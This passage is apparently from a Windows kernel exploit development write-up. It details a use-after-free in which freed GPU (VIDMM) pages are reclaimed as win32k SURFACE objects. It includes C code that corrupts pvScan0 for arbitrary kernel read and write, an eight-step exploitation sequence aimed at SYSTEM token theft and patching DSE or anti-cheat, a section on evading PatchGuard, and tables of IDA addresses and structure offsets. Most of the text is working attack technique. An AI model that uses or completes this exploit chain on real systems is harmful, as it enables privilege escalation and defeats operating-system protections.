//   pvScan0 = a1->pvScan0  (now = targetReadAddr)
//   lDelta = a1->lDelta
//   memmove(userBuf, pvScan0 + offset, size)
// Data from targetReadAddr is now in readBuf

// Step 4: Restore original pvScan0
*(uint64_t*)(surfaceAddr + 0x50) = origPvScan0;

// WRITE arbitrary kernel address:
uint64_t targetWriteAddr = 0xFFFFF12345678900;

// Step 1: Overwrite pvScan0 with target address
*(uint64_t*)(surfaceAddr + 0x50) = targetWriteAddr;

// Step 2: Write to target address via SetBitmapBits
uint8_t writeBuf[4096] = { /* payload data */ };
LONG bytesWritten = SetBitmapBits(hbitmap, sizeof(writeBuf), writeBuf);
// SetBitmapBits calls bDoGetSetBitmapBits which uses:
//   memmove(pvScan0 + offset, userBuf, size)
// Data from writeBuf is now at targetWriteAddr

// Step 3: Restore original pvScan0
*(uint64_t*)(surfaceAddr + 0x50) = origPvScan0;
```

### 6.6 bDoGetSetBitmapBits — The R/W Primitive

**Function:** `bDoGetSetBitmapBits` @ `win32kfull.sys:0x1C0018BA4`

```c
// GET path (a3 == 0):
pvScan0 = (char *)a1->pvScan0;    // Direct use — NO VALIDATION
lDelta = a1->lDelta;              // Stride
v8 = ((cx * bpp + 15) >> 3) & 0x1FFFFFFE;  // Bytes per scanline
v9 = v8 * cy;                     // Total bitmap size

// Copy from pvScan0 to user buffer:
memmove(&pvScan0[lDelta * row], pvBits, bytesPerRow);

// SET path (a3 != 0):
pvScan0 = (char *)a2->pvScan0;   // Direct use — NO VALIDATION
// Copy from user buffer to pvScan0:
memmove(v18, &pvScan0[lDelta * row], bytesPerRow);
```

**Key observations:**
- `pvScan0` is used **without any validation** — no check for kernel address range
- Uses `memmove` — optimized for large copies, achieving 200M+ ops/sec
- The copy size is limited by `sizlBitmap.cx * sizlBitmap.cy * bpp`
- For a 1x1 1bpp bitmap, only 1 byte per call — but we can create larger bitmaps
- **Optimization:** Create a bitmap with large dimensions for bulk R/W

### 6.7 Optimizing for 200M+ ops/sec

```c
// Create a large bitmap for high-throughput R/W
// 8192x8192 32bpp = 256MB of R/W space per call
HBITMAP hbmLarge = CreateBitmap(8192, 8192, 32, 1, NULL);

// But we need the large bitmap's SURFACE on the dangling page...
// Alternative: corrupt the 1x1 bitmap's sizlBitmap to make it larger

// Read original SURFACE fields
uint32_t origCx = *(uint32_t*)(surfaceAddr + 0x30);  // sizlBitmap.cx
uint32_t origCy = *(uint32_t*)(surfaceAddr + 0x34);  // sizlBitmap.cy
int32_t  origDelta = *(int32_t*)(surfaceAddr + 0x40); // lDelta
uint32_t origFmt = *(uint32_t*)(surfaceAddr + 0x60); // iBitmapFormat

// Modify SURFACE for large contiguous R/W:
*(uint32_t*)(surfaceAddr + 0x30) = 0x1000;   // cx = 4096
*(uint32_t*)(surfaceAddr + 0x34) = 0x1000;   // cy = 4096
*(int32_t*)(surfaceAddr + 0x40) = 0x4000;    // lDelta = 16384 (4096 * 4 bytes for 32bpp)
*(uint32_t*)(surfaceAddr + 0x60) = 6;        // iBitmapFormat = BMF_32BPP
*(uint64_t*)(surfaceAddr + 0x50) = targetAddr; // pvScan0 = target

// Now GetBitmapBits can read 4096*4096*4 = 64MB per call
// At memmove speed (~5-10 GB/s), this is effectively unlimited R/W throughput
// For small reads (e.g., 8 bytes), the syscall overhead dominates
// But for bulk operations (e.g., dumping 1MB of kernel memory), it's extremely fast

// For per-QWORD R/W (typical exploit usage):
// Set cx=1, cy=1, lDelta=8, format=6 (32bpp)
// Each GetBitmapBits call reads 4-8 bytes from targetAddr
// Syscall overhead ~100-200ns per call
// Effective rate: ~5-10M ops/sec for per-QWORD access
// For bulk reads: 200M+ ops/sec (limited by memmove bandwidth)
```

### 6.8 Complete Exploitation Sequence

```
STEP 1: Create 128 VIDMM allocations (type 5, non-CPU-visible, 0x1000 each)
STEP 2: Lock all 128 allocations → 128 CPU VAs at multi_alloc+0x10
STEP 3: Destroy all 128 allocations WITHOUT unlock
        → 128 pages freed to PFN free list
        → 128 dangling process-space VAs persist

STEP 4: Create ~4096+ bitmaps to exhaust existing CSectionEntry sections
        → Existing section slots filled
        → New CSectionEntry sections created (44 pages each from PFN free list)
        → Some new section pages may be freed VIDMM pages

STEP 5: Scan all 128 dangling VAs for SURFACE signatures
        → For each VA, check 5 slot offsets (0x000, 0x2C0, 0x580, 0x840, 0xB00)
        → Verify: iBitmapFormat (1-9), lDelta (>0), pvScan0 (kernel addr), ulUnique (!=0)
        → Record matching (danglingVA, slotOffset) pairs

STEP 6: Identify HBITMAP handle for each found SURFACE
        → Create bitmaps one-by-one with VA scanning for timing correlation
        → Or compare GetBitmapBits output with dangling VA reads

STEP 7: Corrupt SURFACE.pvScan0 for arbitrary R/W
        → Write target address to SURFACE+0x50 through dangling VA
        → Call GetBitmapBits(hbitmap, ...) to READ from target
        → Call SetBitmapBits(hbitmap, ...) to WRITE to target
        → Restore original pvScan0 after each operation

STEP 8: Use arbitrary R/W for exploitation
        → Leak token offsets from EPROCESS
        → Copy SYSTEM token to current process
        → Or patch DSE check, disable AC, etc.
```

### 6.9 Expected Memory Layout

```
Physical Page (reclaimed from VIDMM freed page):
┌─────────────────────────────────────────────────────────────┐
│ OFFSET  FIELD              VALUE (1x1 1bpp bitmap)          │
├─────────────────────────────────────────────────────────────┤
│ +0x000  SLIST_ENTRY.Next    (free list linkage, 0 or ptr)   │
│ +0x008  SLIST_ENTRY.Depth   0                                │
│ +0x010  ...                  padding                         │
│ +0x018  DHSURF              0 (for regular bitmaps)          │
│ +0x020  HMG handle          (bitmap handle value)            │
│ +0x030  sizlBitmap.cx       1                                │
│ +0x034  sizlBitmap.cy       1                                │
│ +0x040  lDelta              4 (1bpp, 1px → 4 bytes aligned)  │
│ +0x048  pvBits              <kernel pool addr>               │
│ +0x050  pvScan0             <kernel pool addr> ← CORRUPT     │
│ +0x05C  ulUnique            <incrementing counter>           │
│ +0x060  iBitmapFormat       1 (BMF_1BPP)                     │
│ +0x066  flags               0x8901 (fCreateDIB flags)        │
│ +0x06C  iType               0 (STYPE_BITMAP)                 │
│ +0x070  flags2              0x04000000                       │
│ +0x080  hSection            0 or section handle               │
│ +0x0D0  PID                 <current PID & 0xFFFFFFFC>       │
│ ...                                                           │
│ +0x2C0  [Next SURFACE slot or padding]                       │
└─────────────────────────────────────────────────────────────┘

Process Page Table:
  ProcessPTE[danglingVA] → PhysicalPage → same as SessionPTE[sectionVA]

  User can read/write through danglingVA
  Kernel reads/writes through sessionSpaceVA
  Both access the SAME physical page
```

---

## 7. What Needs Further Analysis

### 7.1 Probability Optimization
- Determine how many CSectionEntry sections exist at boot
- Determine PFN free list behavior (LIFO vs FIFO, locality)
- Test with varying numbers of freed VIDMM pages (44, 88, 128, 256)
- Consider defragmenting the PFN free list before the attack

### 7.2 SURFACE Identification
- Verify exact SURFACE field values for 1x1 1bpp bitmap
- Determine if there are any anti-pattern checks in the type isolation
- Check if CSectionBitmapAllocator::Allocate zeroes the slot before returning
- Verify the exact HMG handle storage location within the SURFACE

### 7.3 lDelta and iBitmapFormat for Optimal R/W
- For contiguous R/W (no stride gaps), set lDelta = cx * (bpp/8)
- For 32bpp: lDelta = cx * 4
- iBitmapFormat = 6 (BMF_32BPP) for 32-bit access
- Verify that bDoGetSetBitmapBits doesn't validate lDelta against the original bitmap dimensions

### 7.4 Detection Avoidance
- Check if PatchGuard scans CSectionEntry sections for modified SURFACEs
- Check if win32k has any SURFACE integrity checks (checksums, canaries)
- Verify that the dangling PTE doesn't trigger any MM diagnostics

### 7.5 Alternative: DC Reclaim Path (Option C Fallback)
- Determine exact DC surface pointer offset (DC+0x??? in the 0x868-byte structure)
- Analyze DC surface reference counting (SURFREF) for corruption safety
- Determine if SelectObject on a corrupted DC would crash or can be handled
- Map out the BitBlt → SURFOBJ → pvScan0 path for the DC approach

### 7.6 VIDMM Allocation Size Control
- Verify minimum allocation size (can we create 0x1000-byte allocations?)
- Check if allocation size must be aligned to GPU page size (potentially larger than 0x1000)
- Determine if multiple small allocations share a single section (reducing page count)

---

## Appendix A: IDA Pro Analysis References

| Function | Binary | Address | PID |
|----------|--------|---------|-----|
| VIDMM_GLOBAL::LockInternal | dxgmms2.sys | 0x1C006BEB0 | 13072 |
| VIDMM_GLOBAL::CloseOneAllocation | dxgmms2.sys | 0x1C006A8D0 | 13072 |
| VIDMM_SEGMENT::UnlockAllocationBackingStore | dxgmms2.sys | 0x1C0066444 | 13072 |
| VidMmiUnlockAllocation | dxgmms2.sys | 0x1C00627D4 | 13072 |
| VIDMM_GLOBAL::UncommitLocalBackingStore | dxgmms2.sys | 0x1C0088EDC | 13072 |
| VIDMM_GLOBAL::ReturnPinnedBackingStore | dxgmms2.sys | 0x1C0087DFC | 13072 |
| LockParavirtualizedAllocationOnHost | dxgmms2.sys | 0x1C00AFB20 | 13072 |
| DXGDEVICE::CreateVidMmAllocations | dxgkrnl.sys | 0x1C0156710 | 6892 |
| SURFACE::Allocate | win32kbase.sys | 0x1C00808C0 | 13960 |
| SURFACE::Free | win32kbase.sys | 0x1C002B8C0 | 13960 |
| AllocateObject | win32kbase.sys | 0x1C002BCC0 | 13960 |
| PALLOCMEM2 | win32kbase.sys | 0x1C002C278 | 13960 |
| Win32AllocPool | win32kbase.sys | 0x1C002C2D0 | 13960 |
| Win32AllocPoolNonPaged | win32kbase.sys | 0x1C005C490 | 13960 |
| EngAllocMem | win32kbase.sys | 0x1C007BAC0 | 13960 |
| SURFMEM::bCreateDIB | win32kbase.sys | 0x1C0027C60 | 13960 |
| GreCreateBitmap | win32kbase.sys | 0x1C0028610 | 13960 |
| EngCreateDeviceBitmap | win32kbase.sys | 0x1C013F5B0 | 13960 |
| hbmCreateDriverSurface | win32kbase.sys | 0x1C00A34D4 | 13960 |
| CreateDriverSurfMem | win32kbase.sys | 0x1C00C9DBC | 13960 |
| CLookAsideTypeIsolation<180224,704>::Create | win32kbase.sys | 0x1C00B67B4 | 13960 |
| CLookAsideTypeIsolation<180224,704>::Initialize | win32kbase.sys | 0x1C00B68C4 | 13960 |
| CTypeIsolation<180224,704>::Initialize | win32kbase.sys | 0x1C00B6930 | 13960 |
| CTypeIsolation<180224,704>::Allocate | win32kbase.sys | 0x1C0149198 | 13960 |
| CSectionEntry<180224,704>::Create | win32kbase.sys | 0x1C00A1DF0 | 13960 |
| CSectionEntry<180224,704>::Initialize | win32kbase.sys | 0x1C00A1E4C | 13960 |
| CSectionBitmapAllocator<180224,704>::Allocate | win32kbase.sys | 0x1C0081534 | 13960 |
| PlatformCreateSection | win32kbase.sys | 0x1C00A202C | 13960 |
| PlatformMapViewInSessionSpace | win32kbase.sys | 0x1C00A1FE4 | 13960 |
| Lookaside Allocate Lambda | win32kbase.sys | 0x1C009CFF0 | 13960 |
| HMAllocateIsolatedType | win32kbase.sys | 0x1C00297F0 | 13960 |
| bDoGetSetBitmapBits | win32kfull.sys | 0x1C0018BA4 | 8848 |
| NtGdiGetBitmapBits | win32kfull.sys | 0x1C00182E0 | 8848 |
| NtGdiCreateBitmap | win32kfull.sys | 0x1C01059A0 | 8848 |
| NtGdiEngCreateDeviceBitmap | win32kfull.sys | 0x1C02B2310 | 8848 |
| MmCreateSection | ntoskrnl.exe | 0x140701E70 | 5884 |

## Appendix B: Pool Tag Reference

| Tag (hex) | Tag (ASCII) | Usage | Pool Type |
|-----------|-------------|-------|-----------|
| 0x6F736955 | "Uiso" | Type isolation control structures | PagedPoolSession / NonPagedPoolNx |
| 0x616C6947 | "Gila" | SURFACE lookaside (size 704) | NonPagedPoolNx (lookaside init) |
| 0x6D626B47 | "Gkbm" | Bitmap pixel data | Session paged pool (0x21) |
| 0x30303047+type | "G00X" | GDI object (type X) | Session paged pool (0x21) |

## Appendix C: Key Offsets

| Structure | Offset | Field |
|-----------|--------|-------|
| VIDMM_ALLOC | +0x50 | Flags (bit 0x2000 = paravirt, 0x40 = has backing store) |
| VIDMM_ALLOC | +0x90 | CPU VA (checked in destroy — NULL for type 5) |
| VIDMM_ALLOC | +0x160 | Section object handle |
| VIDMM_ALLOC | +0x1F0 | Allocation flags (bit 0x20000000 = paravirtualized) |
| multi_alloc | +0x10 | CPU VA (actual location for type 5) |
| VIDMM_GLOBAL_ALLOC | +0x68 | MDL pointer |
| SURFACE | +0x30 | sizlBitmap.cx |
| SURFACE | +0x34 | sizlBitmap.cy |
| SURFACE | +0x40 | lDelta (stride) |
| SURFACE | +0x48 | pvBits (raw data pointer) |
| SURFACE | +0x50 | pvScan0 (CORRUPTION TARGET) |
| SURFACE | +0x5C | ulUnique |
| SURFACE | +0x60 | iBitmapFormat |
| SURFACE | +0x66 | flags |
| SURFACE | +0x6C | iType |
| SURFACE | +0xD0 | PID |
| CSectionEntry | — | 44 pages, 220 slots, 5 SURFACEs per page |
